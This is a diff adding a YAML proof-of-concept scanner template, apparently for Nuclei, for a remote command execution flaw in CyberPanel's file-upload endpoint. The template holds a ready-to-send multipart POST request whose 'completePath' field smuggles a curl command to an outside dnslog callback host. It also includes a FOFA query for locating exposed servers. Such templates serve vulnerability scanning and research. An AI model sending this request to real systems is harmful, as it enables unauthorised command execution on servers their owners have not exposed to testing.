@@ -1,0 +1,47 @@
+id: poc-xga7wme60zoi0osi
+info:
+  name: Cyber​​Panel upload 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xga7wme60zoi0osi'
+  tags: rce,file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xga7wme60zoi0osi
+    fofa: app="CyberPanel"
+http:
+- raw:
+  - 'POST /filemanager/upload HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: multipart/form-data; boundary=----NewBoundary123456789
+
+
+    ------NewBoundary123456789
+
+    Content-Disposition: form-data; name="domainName"
+
+
+    <target>
+
+    ------NewBoundary123456789
+
+    Content-Disposition: form-data; name="completePath"
+
+
+    curl [http://dtrz.dnslog.cn/](http://dtrz.dnslog.cn/)
+
+    ------NewBoundary123456789
+
+    Content-Disposition: form-data; name="file"; filename="poc.txt"
+
+
+    pwn
+
+    ------NewBoundary123456789--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
